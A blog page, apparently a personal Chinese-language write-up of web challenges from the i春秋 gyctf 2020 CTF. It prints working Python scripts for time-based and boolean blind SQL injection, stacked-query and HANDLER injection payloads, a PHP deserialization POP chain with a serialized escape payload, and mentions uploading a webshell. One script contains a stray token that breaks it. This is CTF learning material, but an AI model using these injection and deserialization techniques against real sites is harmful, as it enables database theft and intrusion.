@@ -1,0 +1,785 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="这几天打了i春秋的比赛，好多都是sql注入，有些题还是挺有意思的，这里记录一下，复现环境在buu上 招聘网站随便用xray去fuzz一下，在注册处有时间盲注，挺白给的 exp如下 1234567891011121314151617181920212223242526272829303132333435import requestsimport timeurl = &quot;http://xx/index.">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="i春秋 gyctf web writeup">
+<meta property="og:url" content="http://yoursite.com/2020/02/24/ichunqiu-gyctf/index.html">
+<meta property="og:site_name" content="Moyu&#39;s blog">
+<meta property="og:description" content="这几天打了i春秋的比赛，好多都是sql注入，有些题还是挺有意思的，这里记录一下，复现环境在buu上 招聘网站随便用xray去fuzz一下，在注册处有时间盲注，挺白给的 exp如下 1234567891011121314151617181920212223242526272829303132333435import requestsimport timeurl = &quot;http://xx/index.">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2020-02-26T14:11:38.063Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="i春秋 gyctf web writeup">
+<meta name="twitter:description" content="这几天打了i春秋的比赛，好多都是sql注入，有些题还是挺有意思的，这里记录一下，复现环境在buu上 招聘网站随便用xray去fuzz一下，在注册处有时间盲注，挺白给的 exp如下 1234567891011121314151617181920212223242526272829303132333435import requestsimport timeurl = &quot;http://xx/index.">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/02/24/ichunqiu-gyctf/">
+
+
+
+
+
+  <title>i春秋 gyctf web writeup | Moyu's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Moyu's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/24/ichunqiu-gyctf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Moyu">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/wlp.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Moyu's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">i春秋 gyctf web writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-02-24T21:06:03+08:00">
+                2020-02-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  1.9k
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>这几天打了i春秋的比赛，好多都是sql注入，有些题还是挺有意思的，这里记录一下，复现环境在buu上</p>
+<h3 id="招聘网站"><a href="#招聘网站" class="headerlink" title="招聘网站"></a>招聘网站</h3><p>随便用xray去fuzz一下，在注册处有时间盲注，挺白给的</p>
+<p>exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://xx/index.php?register"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">regname_template = <span class="string">"""'^(select/**/case/**/when(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;0&#125;,1))&gt;&#123;1&#125;)then(sleep(4))else(1)end)^'"""</span></span><br><span class="line">regname_template = <span class="string">"""'^(select/**/case/**/when(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name="flag"),&#123;0&#125;,1))&gt;&#123;1&#125;)then(sleep(4))else(1)end)^'"""</span></span><br><span class="line">regname_template = <span class="string">"""'^(select/**/case/**/when(ascii(substr((select/**/group_concat(flaaag)/**/from/**/flag),&#123;0&#125;,1))&gt;&#123;1&#125;)then(sleep(4))else(1)end)^'"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    u_bound = <span class="number">255</span>; l_bound = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> u_bound &gt;= l_bound:</span><br><span class="line">        m_bound = (u_bound + l_bound) //<span class="number">2</span></span><br><span class="line">        regname = regname_template.format(index, m_bound)</span><br><span class="line">        post_data = &#123;</span><br><span class="line">            <span class="string">"regname"</span>: regname,</span><br><span class="line">            <span class="string">"regpass"</span>: <span class="string">"toor"</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.post(url, data=post_data, timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            l_bound = m_bound + <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        u_bound = m_bound - <span class="number">1</span></span><br><span class="line">        tmp = m_bound</span><br><span class="line">    flag += chr(tmp)</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>
+
+<h3 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h3><p>纯白给，都懒得写wp，随便穿个webshell就过了，运行根目录下的readflag直接出</p>
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>过滤了select和堆叠注入，但是题目给了字段名，直接regexp去匹配就好了</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">"?id=if((fl4g%0aregexp%0a&#123;0&#125;),sleep(5),1)"</span></span><br><span class="line">flag = <span class="string">"flag"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    print(<span class="string">"round "</span>+str(i))</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string.ascii_lowercase + string.digits + <span class="string">'-&#125;&#123;'</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            tmp = url.format(<span class="string">'"^'</span>+flag+j+<span class="string">'"'</span>)</span><br><span class="line">            <span class="comment">#print(tmp)</span></span><br><span class="line">            d = requests.get(tmp)</span><br><span class="line">            <span class="keyword">if</span> d.status_code == <span class="number">404</span>:</span><br><span class="line">                flag+=j</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="comment">#print(d.text)</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="comment">#exit()</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><p>这题比赛的时候没做出来，赛后看了看，题目有<a href="http://www.zip，直接审源码" target="_blank" rel="noopener">www.zip，直接审源码</a></p>
+<p>有个safe方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($parm)</span></span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">'union'</span>,<span class="string">'regexp'</span>,<span class="string">'load'</span>,<span class="string">'into'</span>,<span class="string">'flag'</span>,<span class="string">'file'</span>,<span class="string">'insert'</span>,<span class="string">"'"</span>,<span class="string">'\\'</span>,<span class="string">"*"</span>,<span class="string">"alter"</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">'hacker'</span>,$parm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>和之前0ctf的piapiapia很像，在数据已经序列化的情况下使用过滤函数改变了序列化字符的长度，导致可以逃逸字符出来，然后注入对象</p>
+<p>然后就是pop链的寻找了，可以利用UpdateHelper的__destruct触发User的__toString然后走到Info的__call方法，在__call中调用了dbCtrl类的login方法，通过控制查询语句，把admin账户的密码查出来</p>
+<p>pop链利用如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($age,$nickname)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=$nickname;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UpdateHelper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">"127.0.0.1"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">"noob123"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">"noob123"</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">"noob123"</span>;</span><br><span class="line">    <span class="keyword">public</span> $name=<span class="string">'admin'</span>;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">&#125;</span><br><span class="line">$d = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">$d-&gt;token=<span class="string">'admin'</span>;</span><br><span class="line">$b = <span class="keyword">new</span> Info(<span class="string">''</span>,<span class="string">'1'</span>);</span><br><span class="line">$b-&gt;CtrlCase=$d;</span><br><span class="line">$a = <span class="keyword">new</span> user();</span><br><span class="line">$a-&gt;nickname=$b;</span><br><span class="line">$a-&gt;age=<span class="string">"select password,id from user where username=?"</span>;</span><br><span class="line">$c=<span class="keyword">new</span> UpdateHelper();</span><br><span class="line">$c-&gt;sql=$a;</span><br><span class="line"><span class="keyword">echo</span> serialize($c);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后就是想办法逃逸了，先生成payload，然后计算payload的字符数，再插入黑名单里的词来逃逸，经过计算</p>
+<p>最终payload如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url:http://ip:port/update.php</span><br><span class="line">postdata：</span><br><span class="line">age=&amp;nickname=&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;unionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:1:&quot;1&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:7:&quot;noob123&quot;;s:6:&quot;dbpass&quot;;s:7:&quot;noob123&quot;;s:8:&quot;database&quot;;s:7:&quot;noob123&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样就可以查到admin的密码，解一下是yingyingying，登陆就有flag了</p>
+<h3 id="easysqli"><a href="#easysqli" class="headerlink" title="easysqli"></a>easysqli</h3><p>宽字节+堆叠绕过pdo，参考这篇<a href="https://www.freebuf.com/articles/web/216336.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/216336.html</a></p>
+<p>exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">sql_template = <span class="string">"select if((ascii(substr((select group_concat(fllllll4g) from table1),&#123;0&#125;,1))&gt;&#123;1&#125;),sleep(5),1)"</span></span><br><span class="line">url = <span class="string">"http://0474baf59fe0454495d7a4929a4a7fde3b464a597a1a4bb2.changame.ichunqiu.com/?id="</span></span><br><span class="line"></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    u_bound = <span class="number">255</span>; l_bound = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> u_bound &gt;= l_bound:</span><br><span class="line">        m_bound = (u_bound + l_bound) //<span class="number">2</span></span><br><span class="line">        sql = sql_template.format(index, m_bound)</span><br><span class="line">        hex_string = binascii.b2a_hex(sql.encode(<span class="string">'utf8'</span>))</span><br><span class="line">        query = <span class="string">'''1%df';set/**/@a=0x&#123;0&#125;;prepare/**/eee/**/from/**/@a;execute/**/eee;'''</span>.format(hex_string.decode(<span class="string">'utf8'</span>))</span><br><span class="line">        <span class="keyword">try</span>:dd</span><br><span class="line">            res = requests.get(url + query, timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            l_bound = m_bound + <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        u_bound = m_bound - <span class="number">1</span></span><br><span class="line">        tmp = m_bound</span><br><span class="line">    flag += chr(tmp)</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>
+
+<h3 id="blacklist"><a href="#blacklist" class="headerlink" title="blacklist"></a>blacklist</h3><p>又是一道注入，真就全员堆叠，xswl，先通过堆叠注入来show tables，然后经过查找可以使用handler</p>
+<p>参考链接：<a href="https://www.0x002.com/2020/对MYSQL注入相关内容及部分Trick的归类小结/#handler语句代替select查询" target="_blank" rel="noopener">https://www.0x002.com/2020/%E5%AF%B9MYSQL%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%86%85%E5%AE%B9%E5%8F%8A%E9%83%A8%E5%88%86Trick%E7%9A%84%E5%BD%92%E7%B1%BB%E5%B0%8F%E7%BB%93/#handler%E8%AF%AD%E5%8F%A5%E4%BB%A3%E6%9B%BFselect%E6%9F%A5%E8%AF%A2</a></p>
+<p>exp如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;;handler FlagHere open as t;handler t read first;#</span><br></pre></td></tr></table></figure>
+
+<h3 id="ezsqli"><a href="#ezsqli" class="headerlink" title="ezsqli"></a>ezsqli</h3><p>过滤了in，on字符，就nm离谱</p>
+<p>参考这篇：<a href="https://www.anquanke.com/post/id/193512，可以查表名，但是字段名不知道，就得想点骚操作了" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193512，可以查表名，但是字段名不知道，就得想点骚操作了</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select 1,&#123;&#125;)&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1)</span><br></pre></td></tr></table></figure>
+
+<p>先查出来，然后比较每一位，这样去盲注就好了</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">temp=<span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&amp;*()_-=+&#123;&#125;"</span></span><br><span class="line">url = <span class="string">"http://xx/"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_database</span><span class="params">()</span>:</span></span><br><span class="line">    flag = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> string.printable:</span><br><span class="line">            paramsPost = &#123;<span class="string">"id"</span>: <span class="string">"0^(substr((version()),&#123;0&#125;,1)='&#123;1&#125;')\x23"</span>.format(i, j)&#125;</span><br><span class="line">            response = requests.post(url,data=paramsPost)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'Nu1L'</span> <span class="keyword">in</span> response.content:</span><br><span class="line">                flag = flag + j</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_tablename</span><span class="params">()</span>:</span></span><br><span class="line">    flag = <span class="string">""</span></span><br><span class="line">    <span class="comment"># users233333333333333,f1ag_1s_h3r3_hhhhh</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> string.printable:</span><br><span class="line">            paramsPost = &#123;<span class="string">"id"</span>: <span class="string">"0^(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),&#123;0&#125;,1)='&#123;1&#125;')\x23"</span>.format(i, j)&#125;</span><br><span class="line">            response = requests.post(url,data=paramsPost)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'Nu1L'</span> <span class="keyword">in</span> response.content:</span><br><span class="line">                flag = flag + j</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">()</span>:</span></span><br><span class="line">    flag = <span class="string">""</span></span><br><span class="line">    t=<span class="string">"0x"</span></span><br><span class="line">    <span class="comment"># users233333333333333,f1ag_1s_h3r3_hhhhh</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>,<span class="number">256</span>):</span><br><span class="line">            p=t+hex(j)[<span class="number">2</span>:]</span><br><span class="line">            print(p)</span><br><span class="line">            paramsPost = &#123;<span class="string">"id"</span>: <span class="string">"((select 1,&#123;&#125;)&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1));\x23"</span>.format(p)&#125;</span><br><span class="line">            response = requests.post(url,data=paramsPost)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'Nu1L'</span> <span class="keyword">in</span> response.content:</span><br><span class="line">                t=t+hex(j<span class="number">-1</span>)[<span class="number">2</span>:]</span><br><span class="line">                print(t)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get_flag()</span><br></pre></td></tr></table></figure>
+
+<p>注，就硬注</p>
+<p>此处buu复现好像有些问题，用smile的exp也没打出来flag，也没细想</p>
